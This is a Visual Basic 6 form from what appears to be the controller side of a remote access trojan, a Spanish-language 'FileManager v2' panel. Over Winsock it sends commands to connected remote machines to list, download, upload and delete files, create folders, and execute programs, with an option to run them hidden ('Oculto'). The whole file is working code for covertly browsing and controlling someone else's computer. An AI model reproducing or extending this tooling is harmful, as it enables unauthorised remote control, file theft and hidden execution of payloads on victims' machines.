VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{DA729E34-689F-49EA-A856-B57046630B73}#1.0#0"; "Bar.ocx"
Begin VB.Form fmanager 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "FileManager v2"
   ClientHeight    =   12075
   ClientLeft      =   7770
   ClientTop       =   3180
   ClientWidth     =   13335
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   12075
   ScaleWidth      =   13335
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command2 
      Caption         =   "&Subir"
      Height          =   255
      Left            =   9480
      TabIndex        =   11
      Top             =   120
      Width           =   855
   End
   Begin VB.CommandButton Command7 
      Caption         =   "&PC"
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   120
      Width           =   615
   End
   Begin VB.CommandButton Command6 
      Caption         =   "&Atras"
      Height          =   255
      Left            =   840
      TabIndex        =   9
      Top             =   120
      Width           =   615
   End
   Begin VB.OptionButton Option2 
      Caption         =   "&Oculto"
      Height          =   255
      Left            =   8520
      TabIndex        =   8
      Top             =   120
      Width           =   855
   End
   Begin VB.OptionButton Option1 
      Caption         =   "&Normal"
      Height          =   255
      Left            =   7560
      TabIndex        =   7
      Top             =   120
      Width           =   855
   End
   Begin VB.CommandButton Command4 
      Caption         =   "&Buscar"
      Enabled         =   0   'False
      Height          =   255
      Left            =   6600
      TabIndex        =   6
      Top             =   120
      Width           =   855
   End
   Begin VB.TextBox campo 
      Enabled         =   0   'False
      Height          =   285
      Left            =   5520
      TabIndex        =   5
      Top             =   120
      Width           =   975
   End
   Begin Proyecto2.XP_ProgressBar XP_ProgressBar1 
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   11760
      Width           =   13095
      _ExtentX        =   23098
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BrushStyle      =   0
      Color           =   16750899
   End
   Begin VB.CommandButton Command3 
      Caption         =   "&Cerrar"
      Height          =   255
      Left            =   12240
      TabIndex        =   3
      Top             =   120
      Width           =   855
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   8520
      OleObjectBlob   =   "fmanager.frx":0000
      Top             =   3360
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   9000
      Top             =   4320
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&IR"
      Height          =   255
      Left            =   1560
      TabIndex        =   2
      Top             =   120
      Width           =   615
   End
   Begin VB.TextBox Text10 
      Height          =   285
      Left            =   2280
      TabIndex        =   1
      Top             =   120
      Width           =   3015
   End
   Begin MSComctlLib.ListView arch 
      Height          =   11055
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   13095
      _ExtentX        =   23098
      _ExtentY        =   19500
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      MousePointer    =   1
      NumItems        =   4
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "a"
         Object.Tag             =   "a"
         Text            =   "Archivos"
         Object.Width           =   6174
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Key             =   "b"
         Object.Tag             =   "b"
         Text            =   "Atributo"
         Object.Width           =   3175
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Key             =   "c"
         Object.Tag             =   "c"
         Text            =   "Directorio"
         Object.Width           =   4588
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Key             =   "d"
         Object.Tag             =   "d"
         Text            =   "Tamaño"
         Object.Width           =   3881
      EndProperty
   End
   Begin VB.Menu MnuContex 
      Caption         =   "Opciones"
      Enabled         =   0   'False
      Visible         =   0   'False
      Begin VB.Menu mDescargar 
         Caption         =   "Descargar"
      End
      Begin VB.Menu mBorrar 
         Caption         =   "Borrar"
      End
      Begin VB.Menu mEjecutar 
         Caption         =   "Ejecutar"
      End
      Begin VB.Menu mSubir 
         Caption         =   "Subir"
      End
      Begin VB.Menu mActualizar 
         Caption         =   "Actualizar"
      End
      Begin VB.Menu mCarpeta 
         Caption         =   "Crear carpeta"
      End
   End
End
Attribute VB_Name = "fmanager"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean

Option Explicit

Dim vIndex As Variant
Dim Index_n As Integer
Dim path As String
Dim Path_Do As String
Dim PreviewPath As String
Dim Pathxx As String
Dim Pathal As String

Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Dim i As Integer

Private Sub arch_DblClick()
If arch.SelectedItem.SubItems(1) = "Carpeta" Or arch.SelectedItem.SubItems(1) = "Disco duro" Or arch.SelectedItem.SubItems(1) = "Disco extraible" Or _
    arch.SelectedItem.SubItems(1) = "CD-ROM" Or arch.SelectedItem.SubItems(1) = "Remoto" Or arch.SelectedItem.SubItems(1) = "NO SE DETECTO EL ATRIBUTO" Or _
    arch.SelectedItem.Text = "[Escritorio]" Or arch.SelectedItem.Text = "[Archivos de programa]" Or arch.SelectedItem.Text = "[Documentos]" Or _
    arch.SelectedItem.Text = "[Archivos temporales]" Then

    If arch.SelectedItem.SubItems(1) = "Disco duro o fijo" Or arch.SelectedItem.SubItems(1) = "Disco extraible" Or _
    arch.SelectedItem.SubItems(1) = "CD-ROM" Or arch.SelectedItem.SubItems(1) = "Remoto" Then
    
        PreviewPath = arch.SelectedItem.Text
        Path_Do = arch.SelectedItem.Text
        
    ElseIf arch.SelectedItem.Text = "[Escritorio]" Then
    
        Text10.Text = "4"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
        PreviewPath = "7"
        
    ElseIf arch.SelectedItem.Text = "[Archivos de programa]" Then
    
        Text10.Text = "5"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
        PreviewPath = "7"
        
    ElseIf arch.SelectedItem.Text = "[Documentos]" Then
    
        Text10.Text = "3"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
        PreviewPath = "7"
    
    ElseIf arch.SelectedItem.Text = "[Archivos temporales]" Then
    
        Text10.Text = "6"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
        PreviewPath = "7"
    
    Else
    
        If PreviewPath = "" Then
            PreviewPath = arch.SelectedItem.SubItems(2)
        End If
        
        Path_Do = arch.SelectedItem.SubItems(2) '& "\*"
        PreviewPath = Path_Do
    End If
    
    Command6.Enabled = True
    
    arch.ListItems.Clear
    
    If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
        Form1.Winsock1(vIndex(0)).SendData "diz" & Path_Do
    Else
        Unload Me
    End If
    
End If
End Sub

Private Sub arch_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

Dim Itema As ListItem
      
If Button = vbRightButton Then
          
    Set Itema = arch.HitTest(x, y)
          
    If Not Itema Is Nothing Then
              
        Set arch.SelectedItem = Itema
        PopupMenu MnuContex
          
    End If
          
          
End If
End Sub

Private Sub Command1_Click()
'Limpiamos la lista
arch.ListItems.Clear

'1 windows
'2 System
'3 usuarios
'4 escritorio
'5 archivos de programa
'6 archivs temporales
If Text10.Text = "ayuda" Then

    MsgBox "Presionando los siguientes nombres podras obtener los nombres de los directorios" & vbCrLf & vbCrLf & "WINDOWS - para el directorio de windows" & vbCrLf _
    & "SISTEMA - para el directorio del sistema" & vbCrLf & "USUARIOS - para las carpetas de usuario" & vbCrLf _
    & "ESCRITORIO - para ver los archivos del escritorio" & vbCrLf & "PROGRAMAS - para los archivos de programa" & vbCrLf & "TEMPORALES - para los archivos temporales" _
    & vbCrLf & "DRIVERS para los discos locales", vbInformation + vbOKOnly, "Ayuda"

Else

If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    If Text10.Text = "SISTEMA" Or Text10.Text = "SYSTEM" Or Text10.Text = "%systemroot%" Then
    
        Text10.Text = "2"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "WINDOWS" Or Text10.Text = "%windir%" Then
    
        Text10.Text = "1"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "USUARIOS" Or Text10.Text = "USERS" Or Text10.Text = "%userprofile%" Then
    
        Text10.Text = "3"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "DESKTOP" Or Text10.Text = "ESCRITORIO" Or Text10.Text = "%desktop%" Then
    
        Text10.Text = "4"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "ARCHIVOS DE PROGRAMA" Or Text10.Text = "PROGRAM FILES" Or Text10.Text = "%programfiles%" Or Text10.Text = "PROGRAMAS" Then
    
        Text10.Text = "5"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "TEMPORALES" Or Text10.Text = "TEMP" Or Text10.Text = "%tmp%" Or Text10.Text = "%temp%" Then
    
        Text10.Text = "6"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "DRIVERS" Or Text10.Text = "drivers" Or Text10.Text = "%drivers%" Or Text10.Text = "%homedrivers%" Then
    
        Text10.Text = "7"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    Else
    
        If Not Text10.Text = "" Then
            arch.ListItems.Clear
            Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text & "\*"
        Else
            MsgBox "Ingrese una direccion", vbInformation, vbOKOnly, "Aviso"
            Text10.SetFocus
        End If
        
    End If
Else
    lista.List1.ListItems.Add , , "[Error al procesar comando - conexion perdida]"
    Unload Me
End If

End If
End Sub


Private Sub Command2_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    Form2.file.DialogTitle = "Selecione un archivo a enviar"
    Form2.file.Filter = "Todos los archivos (*.*)|*.*"
    Form2.file.FilterIndex = 1
    Form2.file.ShowOpen
    
        If Form2.file.FileName <> "" Then
    
            fmanager_d.show
            fmanager_d.path.Text = arch.SelectedItem.SubItems(2)
            fmanager_d.Label1.Caption = arch.SelectedItem.SubItems(2)
            
        End If
End If
End Sub

Private Sub Command3_Click()
Unload Me
End Sub

Private Sub Command4_Click()

If Not campo.Text = "" Then

    For i = 1 To arch.ListItems.Count
        If arch.ListItems(i).Text = campo.Text Then
            MsgBox "El archivo existe, y se ha encontrado", vbInformation + vbOKOnly, "En el index " & i
            Exit For
        ElseIf i = arch.ListItems.Count Then
            If Not arch.ListItems(i).Text = campo.Text Then
                MsgBox "Error no se ha encontrado el archivo", vbCritical + vbOKOnly, "Error"
            End If
        End If
    Next i
Else
    MsgBox "Ingrese un valor, ejemplo picture.jpg", vbCritical + vbOKOnly, "Error"
    campo.Text = ""
    campo.SetFocus
End If

End Sub


Private Sub Command6_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    If PreviewPath = "7" Or PreviewPath = "" Then
        arch.ListItems.Clear
        
        arch.ListItems.Add , , "[Escritorio]"
        arch.ListItems.Add , , "[Archivos de programa]"
        arch.ListItems.Add , , "[Documentos]"
        arch.ListItems.Add , , "[Archivos temporales]"
    
        Form1.Winsock1(vIndex(0)).SendData "diz" & PreviewPath
    Else
        arch.ListItems.Clear

        Form1.Winsock1(vIndex(0)).SendData "diz" & PreviewPath
    End If
Else
    Unload Me
End If

End Sub

Private Sub Command7_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Text10.Text = "7"
    
    arch.ListItems.Clear
    
    arch.ListItems.Add , , "[Escritorio]"
    arch.ListItems.Add , , "[Archivos de programa]"
    arch.ListItems.Add , , "[Documentos]"
    arch.ListItems.Add , , "[Archivos temporales]"
    
    Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
    Text10.Text = ""
    Text10.SetFocus
End If

End Sub

Private Sub Form_Activate()
Text10.SetFocus
End Sub
Private Sub Form_Resize()
    Dim ScaleFactorX As Single, ScaleFactorY As Single

      If Not DoResize Then
         DoResize = True
         Exit Sub
      End If

      RePosForm = False
      ScaleFactorX = Me.Width / MyForm.Width
      ScaleFactorY = Me.Height / MyForm.Height
      Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      MyForm.Height = Me.Height
      MyForm.Width = Me.Width
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin fmanager.hwnd
End If

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
    arch.ListItems.Clear
    arch.ListItems.Add , , "[Escritorio]"
    arch.ListItems.Add , , "[Archivos de programa]"
    arch.ListItems.Add , , "[Documentos]"
    arch.ListItems.Add , , "[Archivos temporales]"

    Form1.Winsock1(vIndex(0)).SendData "diz" & "7"
End If

Dim ScaleFactorX As Single, ScaleFactorY As Single

DesignX = 800
DesignY = 600
RePosForm = True
DoResize = False

Xtwips = Screen.TwipsPerPixelX
Ytwips = Screen.TwipsPerPixelY
Ypixels = Screen.Height / Ytwips
Xpixels = Screen.Width / Xtwips

ScaleFactorX = ((Xpixels / DesignX) / 2) - 100
ScaleFactorY = ((Ypixels / DesignY) / 2) - 100
ScaleMode = 1

Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
MyForm.Height = Me.Height
MyForm.Width = Me.Width


'arch.ColumnHeaders.Add , , "Opciones"
End Sub


Private Sub mActualizar_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Pathal = arch.SelectedItem.SubItems(2) & "*"
    arch.ListItems.Clear
    Form1.Winsock1(vIndex(0)).SendData "diz" & Pathal
End If
End Sub

Private Sub mBorrar_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
        Text10.Text = ""
        Pathxx = arch.SelectedItem.SubItems(2) & arch.SelectedItem.Text
        Form1.Winsock1(vIndex(0)).SendData "del" & Pathxx
        arch.ListItems.Remove (arch.SelectedItem.Index)
End If
End Sub

Private Sub mCarpeta_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    carpeta.show
End If
End Sub

Private Sub mDescargar_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    path = arch.SelectedItem.SubItems(2)
    Form1.Winsock1(vIndex(0)).SendData "trx" & path
End If
End Sub

Private Sub mEjecutar_Click()
Dim modoejecutar As String

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
    path = arch.SelectedItem.SubItems(2)
    
    If Option1.Value = False And Option2.Value = False Then
        Option1.Value = True
    End If
    
    If Option1.Value = True Then
        Form1.Winsock1(vIndex(0)).SendData "ope" & path & "1"
    End If
        
    If Option2.Value = True Then
        Form1.Winsock1(vIndex(0)).SendData "ope" & path & "0"
    End If
        
    lista.List1.ListItems.Add , , "Ejecutando [" & path & "] Remotamente"

Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub


Private Sub mSubir_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    Form2.file.DialogTitle = "Selecione un archivo a enviar"
    Form2.file.Filter = "Todos los archivos (*.*)|*.*"
    Form2.file.FilterIndex = 1
    Form2.file.ShowOpen
    
        If Form2.file.FileName <> "" Then
    
            fmanager_d.show
            fmanager_d.path.Text = arch.SelectedItem.SubItems(2)
            fmanager_d.Label1.Caption = arch.SelectedItem.SubItems(2)
            
        End If
End If
End Sub

Private Sub Text10_KeyPress(KeyAscii As Integer)

If KeyAscii = 13 Then
'Limpiamos la lista
arch.ListItems.Clear

'1 windows
'2 System
'3 usuarios
'4 escritorio
'5 archivos de programa
'6 archivs temporales
If Text10.Text = "ayuda" Then

    MsgBox "Presionando los siguientes nombres podras obtener los nombres de los directorios" & vbCrLf & vbCrLf & "WINDOWS - para el directorio de windows" & vbCrLf _
    & "SISTEMA - para el directorio del sistema" & vbCrLf & "USUARIOS - para las carpetas de usuario" & vbCrLf _
    & "ESCRITORIO - para ver los archivos del escritorio" & vbCrLf & "PROGRAMAS - para los archivos de programa" & vbCrLf & "TEMPORALES - para los archivos temporales" _
    & vbCrLf & "DRIVERS para los discos locales", vbInformation + vbOKOnly, "Ayuda"

Else

If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    If Text10.Text = "SISTEMA" Or Text10.Text = "SYSTEM" Or Text10.Text = "%systemroot%" Then
    
        Text10.Text = "2"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "WINDOWS" Or Text10.Text = "%windir%" Then
    
        Text10.Text = "1"
    
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "USUARIOS" Or Text10.Text = "USERS" Or Text10.Text = "%userprofile%" Then
    
        Text10.Text = "3"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "DESKTOP" Or Text10.Text = "ESCRITORIO" Or Text10.Text = "%desktop%" Then
    
        Text10.Text = "4"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "ARCHIVOS DE PROGRAMA" Or Text10.Text = "PROGRAM FILES" Or Text10.Text = "%programfiles%" Or Text10.Text = "PROGRAMAS" Then
    
        Text10.Text = "5"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "TEMPORALES" Or Text10.Text = "TEMP" Or Text10.Text = "%tmp%" Or Text10.Text = "%temp%" Then
    
        Text10.Text = "6"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    ElseIf Text10.Text = "DRIVERS" Or Text10.Text = "drivers" Or Text10.Text = "%drivers%" Or Text10.Text = "%homedrivers%" Then
    
        Text10.Text = "7"
        
        arch.ListItems.Clear
        Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text
        Text10.Text = ""
        Text10.SetFocus
        
    Else

        If Not Text10.Text = "" Then
            arch.ListItems.Clear
            Form1.Winsock1(vIndex(0)).SendData "diz" & Text10.Text & "\*"
        Else
            MsgBox "Ingrese una direccion", vbInformation, vbOKOnly, "Aviso"
            Text10.SetFocus
        End If
        
    End If
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End If
End If
End Sub

Private Sub Timer1_Timer()

If arch.ListItems.Count >= 1 Then

    campo.Enabled = True
    Command4.Enabled = True
    Option1.Enabled = True
    Option2.Enabled = True
Else
    campo.Enabled = False
    Command4.Enabled = False
    Option1.Enabled = False
    Option2.Enabled = False
End If

If Not Form1.Winsock1(vIndex(0)).state = sckConnected Then
Unload Me
End If

End Sub
